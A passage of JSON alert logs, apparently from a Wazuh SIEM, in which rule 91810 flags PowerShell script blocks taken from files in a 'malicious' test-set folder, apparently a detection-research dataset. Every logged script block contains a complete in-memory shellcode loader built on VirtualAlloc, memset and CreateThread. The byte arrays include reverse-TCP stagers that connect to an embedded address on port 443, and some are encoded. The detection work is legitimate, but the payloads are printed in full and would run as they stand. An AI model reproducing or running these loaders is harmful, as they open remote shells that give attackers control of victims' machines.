x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$t8d=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($t8d.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$t8d,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 65ab63b3-48a7-489a-b453-1271cb636820\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1690.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$Yiu = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Yiu -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc5,0x1c,0x4d,0x4b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$t8d=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($t8d.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$t8d,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"65ab63b3-48a7-489a-b453-1271cb636820","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1690.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:04.185+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":41,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015644.664688","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:33.7834858Z","eventRecordID":"200972","processID":"8948","threadID":"10120","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$jdi = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $jdi -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x25,0xe3,0xea,0x37,0xd9,0xc4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x43,0x13,0x03,0x43,0x13,0x83,0xc3,0x21,0x01,0x1f,0xcb,0xc1,0x47,0xe0,0x34,0x11,0x28,0x68,0xd1,0x20,0x68,0x0e,0x91,0x12,0x58,0x44,0xf7,0x9e,0x13,0x08,0xec,0x15,0x51,0x85,0x03,0x9e,0xdc,0xf3,0x2a,0x1f,0x4c,0xc7,0x2d,0xa3,0x8f,0x14,0x8e,0x9a,0x5f,0x69,0xcf,0xdb,0x82,0x80,0x9d,0xb4,0xc9,0x37,0x32,0xb1,0x84,0x8b,0xb9,0x89,0x09,0x8c,0x5e,0x59,0x2b,0xbd,0xf0,0xd2,0x72,0x1d,0xf2,0x37,0x0f,0x14,0xec,0x54,0x2a,0xee,0x87,0xae,0xc0,0xf1,0x41,0xff,0x29,0x5d,0xac,0x30,0xd8,0x9f,0xe8,0xf6,0x03,0xea,0x00,0x05,0xb9,0xed,0xd6,0x74,0x65,0x7b,0xcd,0xde,0xee,0xdb,0x29,0xdf,0x23,0xbd,0xba,0xd3,0x88,0xc9,0xe5,0xf7,0x0f,0x1d,0x9e,0x03,0x9b,0xa0,0x71,0x82,0xdf,0x86,0x55,0xcf,0x84,0xa7,0xcc,0xb5,0x6b,0xd7,0x0f,0x16,0xd3,0x7d,0x5b,0xba,0x00,0x0c,0x06,0xd2,0xe5,0x3d,0xb9,0x22,0x62,0x35,0xca,0x10,0x2d,0xed,0x44,0x18,0xa6,0x2b,0x92,0x5f,0x9d,0x8c,0x0c,0x9e,0x1e,0xed,0x05,0x64,0x4a,0xbd,0x3d,0x4d,0xf3,0x56,0xbe,0x72,0x26,0xc2,0xbb,0xe4,0xa0,0x76,0x14,0x90,0x5a,0x7b,0x94,0x40,0x45,0xf2,0x72,0x20,0x29,0x55,0x2b,0x80,0x99,0x15,0x9b,0x68,0xf0,0x99,0xc4,0x88,0xfb,0x73,0x6d,0x22,0x14,0x2a,0xc5,0xda,0x8d,0x77,0x9d,0x7b,0x51,0xa2,0xdb,0xbb,0xd9,0x41,0x1b,0x75,0x2a,0x2f,0x0f,0xe1,0xda,0x7a,0x6d,0xa7,0xe5,0x50,0x18,0x47,0x70,0x5f,0x8b,0x10,0xec,0x5d,0xea,0x56,0xb3,0x9e,0xd9,0xed,0x7a,0x0b,0xa2,0x99,0x82,0xdb,0x22,0x59,0xd5,0xb1,0x22,0x31,0x81,0xe1,0x70,0x24,0xce,0x3f,0xe5,0xf5,0x5b,0xc0,0x5c,0xaa,0xcc,0xa8,0x62,0x95,0x3b,0x77,0x9c,0xf0,0xbd,0x4b,0x4b,0x3c,0xc8,0xa5,0x4f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$U4S7=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($U4S7.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$U4S7,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 44665700-08d7-4250-a851-cc0788282600\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1699.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$jdi = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $jdi -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x25,0xe3,0xea,0x37,0xd9,0xc4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x43,0x13,0x03,0x43,0x13,0x83,0xc3,0x21,0x01,0x1f,0xcb,0xc1,0x47,0xe0,0x34,0x11,0x28,0x68,0xd1,0x20,0x68,0x0e,0x91,0x12,0x58,0x44,0xf7,0x9e,0x13,0x08,0xec,0x15,0x51,0x85,0x03,0x9e,0xdc,0xf3,0x2a,0x1f,0x4c,0xc7,0x2d,0xa3,0x8f,0x14,0x8e,0x9a,0x5f,0x69,0xcf,0xdb,0x82,0x80,0x9d,0xb4,0xc9,0x37,0x32,0xb1,0x84,0x8b,0xb9,0x89,0x09,0x8c,0x5e,0x59,0x2b,0xbd,0xf0,0xd2,0x72,0x1d,0xf2,0x37,0x0f,0x14,0xec,0x54,0x2a,0xee,0x87,0xae,0xc0,0xf1,0x41,0xff,0x29,0x5d,0xac,0x30,0xd8,0x9f,0xe8,0xf6,0x03,0xea,0x00,0x05,0xb9,0xed,0xd6,0x74,0x65,0x7b,0xcd,0xde,0xee,0xdb,0x29,0xdf,0x23,0xbd,0xba,0xd3,0x88,0xc9,0xe5,0xf7,0x0f,0x1d,0x9e,0x03,0x9b,0xa0,0x71,0x82,0xdf,0x86,0x55,0xcf,0x84,0xa7,0xcc,0xb5,0x6b,0xd7,0x0f,0x16,0xd3,0x7d,0x5b,0xba,0x00,0x0c,0x06,0xd2,0xe5,0x3d,0xb9,0x22,0x62,0x35,0xca,0x10,0x2d,0xed,0x44,0x18,0xa6,0x2b,0x92,0x5f,0x9d,0x8c,0x0c,0x9e,0x1e,0xed,0x05,0x64,0x4a,0xbd,0x3d,0x4d,0xf3,0x56,0xbe,0x72,0x26,0xc2,0xbb,0xe4,0xa0,0x76,0x14,0x90,0x5a,0x7b,0x94,0x40,0x45,0xf2,0x72,0x20,0x29,0x55,0x2b,0x80,0x99,0x15,0x9b,0x68,0xf0,0x99,0xc4,0x88,0xfb,0x73,0x6d,0x22,0x14,0x2a,0xc5,0xda,0x8d,0x77,0x9d,0x7b,0x51,0xa2,0xdb,0xbb,0xd9,0x41,0x1b,0x75,0x2a,0x2f,0x0f,0xe1,0xda,0x7a,0x6d,0xa7,0xe5,0x50,0x18,0x47,0x70,0x5f,0x8b,0x10,0xec,0x5d,0xea,0x56,0xb3,0x9e,0xd9,0xed,0x7a,0x0b,0xa2,0x99,0x82,0xdb,0x22,0x59,0xd5,0xb1,0x22,0x31,0x81,0xe1,0x70,0x24,0xce,0x3f,0xe5,0xf5,0x5b,0xc0,0x5c,0xaa,0xcc,0xa8,0x62,0x95,0x3b,0x77,0x9c,0xf0,0xbd,0x4b,0x4b,0x3c,0xc8,0xa5,0x4f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$U4S7=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($U4S7.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$U4S7,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"44665700-08d7-4250-a851-cc0788282600","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1699.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:05.229+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":42,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015645.676050","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:34.6945596Z","eventRecordID":"200976","processID":"5368","threadID":"2840","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4e,0x6a,0x1c,0xa6,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: a3d2f0ca-4261-43ea-9c7d-85d1e7a4b20e\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1707.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4e,0x6a,0x1c,0xa6,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"a3d2f0ca-4261-43ea-9c7d-85d1e7a4b20e","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1707.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:06.695+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":43,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015646.686998","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:36.4382570Z","eventRecordID":"200983","processID":"9692","threadID":"11452","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x35,0x51,0x14,0xba,0xda,0xda,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x47,0x0f,0x03,0x47,0x3a,0xb3,0xe1,0x46,0xac,0xb1,0x0a,0xb7,0x2c,0xd6,0x83,0x52,0x1d,0xd6,0xf0,0x17,0x0d,0xe6,0x73,0x75,0xa1,0x8d,0xd6,0x6e,0x32,0xe3,0xfe,0x81,0xf3,0x4e,0xd9,0xac,0x04,0xe2,0x19,0xae,0x86,0xf9,0x4d,0x10,0xb7,0x31,0x80,0x51,0xf0,0x2c,0x69,0x03,0xa9,0x3b,0xdc,0xb4,0xde,0x76,0xdd,0x3f,0xac,0x97,0x65,0xa3,0x64,0x99,0x44,0x72,0xff,0xc0,0x46,0x74,0x2c,0x79,0xcf,0x6e,0x31,0x44,0x99,0x05,0x81,0x32,0x18,0xcc,0xd8,0xbb,0xb7,0x31,0xd5,0x49,0xc9,0x76,0xd1,0xb1,0xbc,0x8e,0x22,0x4f,0xc7,0x54,0x59,0x8b,0x42,0x4f,0xf9,0x58,0xf4,0xab,0xf8,0x8d,0x63,0x3f,0xf6,0x7a,0xe7,0x67,0x1a,0x7c,0x24,0x1c,0x26,0xf5,0xcb,0xf3,0xaf,0x4d,0xe8,0xd7,0xf4,0x16,0x91,0x4e,0x50,0xf8,0xae,0x91,0x3b,0xa5,0x0a,0xd9,0xd1,0xb2,0x26,0x80,0xbd,0x77,0x0b,0x3b,0x3d,0x10,0x1c,0x48,0x0f,0xbf,0xb6,0xc6,0x23,0x48,0x11,0x10,0x44,0x63,0xe5,0x8e,0xbb,0x8c,0x16,0x86,0x7f,0xd8,0x46,0xb0,0x56,0x61,0x0d,0x40,0x57,0xb4,0xb8,0x45,0xcf,0xf7,0x95,0x47,0x0c,0x90,0xe7,0x47,0x13,0xdb,0x61,0xa1,0x43,0x4b,0x22,0x7e,0x23,0x3b,0x82,0x2e,0xcb,0x51,0x0d,0x10,0xeb,0x59,0xc7,0x39,0x81,0xb5,0xbe,0x12,0x3d,0x2f,0x9b,0xe9,0xdc,0xb0,0x31,0x94,0xde,0x3b,0xb6,0x68,0x90,0xcb,0xb3,0x7a,0x44,0x3c,0x8e,0x21,0xc2,0x43,0x24,0x4f,0xea,0xd1,0xc3,0xc6,0xbd,0x4d,0xce,0x3f,0x89,0xd1,0x31,0x6a,0x82,0xd8,0xa7,0xd5,0xfc,0x24,0x28,0xd6,0xfc,0x72,0x22,0xd6,0x94,0x22,0x16,0x85,0x81,0x2c,0x83,0xb9,0x1a,0xb9,0x2c,0xe8,0xcf,0x6a,0x45,0x16,0x36,0x5c,0xca,0xe9,0x1d,0x5c,0x36,0x3c,0x5b,0x2a,0x56,0xfc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 0e5fb504-66df-4bf7-9f01-bbe7b73afc8e\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1730.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x35,0x51,0x14,0xba,0xda,0xda,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x47,0x0f,0x03,0x47,0x3a,0xb3,0xe1,0x46,0xac,0xb1,0x0a,0xb7,0x2c,0xd6,0x83,0x52,0x1d,0xd6,0xf0,0x17,0x0d,0xe6,0x73,0x75,0xa1,0x8d,0xd6,0x6e,0x32,0xe3,0xfe,0x81,0xf3,0x4e,0xd9,0xac,0x04,0xe2,0x19,0xae,0x86,0xf9,0x4d,0x10,0xb7,0x31,0x80,0x51,0xf0,0x2c,0x69,0x03,0xa9,0x3b,0xdc,0xb4,0xde,0x76,0xdd,0x3f,0xac,0x97,0x65,0xa3,0x64,0x99,0x44,0x72,0xff,0xc0,0x46,0x74,0x2c,0x79,0xcf,0x6e,0x31,0x44,0x99,0x05,0x81,0x32,0x18,0xcc,0xd8,0xbb,0xb7,0x31,0xd5,0x49,0xc9,0x76,0xd1,0xb1,0xbc,0x8e,0x22,0x4f,0xc7,0x54,0x59,0x8b,0x42,0x4f,0xf9,0x58,0xf4,0xab,0xf8,0x8d,0x63,0x3f,0xf6,0x7a,0xe7,0x67,0x1a,0x7c,0x24,0x1c,0x26,0xf5,0xcb,0xf3,0xaf,0x4d,0xe8,0xd7,0xf4,0x16,0x91,0x4e,0x50,0xf8,0xae,0x91,0x3b,0xa5,0x0a,0xd9,0xd1,0xb2,0x26,0x80,0xbd,0x77,0x0b,0x3b,0x3d,0x10,0x1c,0x48,0x0f,0xbf,0xb6,0xc6,0x23,0x48,0x11,0x10,0x44,0x63,0xe5,0x8e,0xbb,0x8c,0x16,0x86,0x7f,0xd8,0x46,0xb0,0x56,0x61,0x0d,0x40,0x57,0xb4,0xb8,0x45,0xcf,0xf7,0x95,0x47,0x0c,0x90,0xe7,0x47,0x13,0xdb,0x61,0xa1,0x43,0x4b,0x22,0x7e,0x23,0x3b,0x82,0x2e,0xcb,0x51,0x0d,0x10,0xeb,0x59,0xc7,0x39,0x81,0xb5,0xbe,0x12,0x3d,0x2f,0x9b,0xe9,0xdc,0xb0,0x31,0x94,0xde,0x3b,0xb6,0x68,0x90,0xcb,0xb3,0x7a,0x44,0x3c,0x8e,0x21,0xc2,0x43,0x24,0x4f,0xea,0xd1,0xc3,0xc6,0xbd,0x4d,0xce,0x3f,0x89,0xd1,0x31,0x6a,0x82,0xd8,0xa7,0xd5,0xfc,0x24,0x28,0xd6,0xfc,0x72,0x22,0xd6,0x94,0x22,0x16,0x85,0x81,0x2c,0x83,0xb9,0x1a,0xb9,0x2c,0xe8,0xcf,0x6a,0x45,0x16,0x36,0x5c,0xca,0xe9,0x1d,0x5c,0x36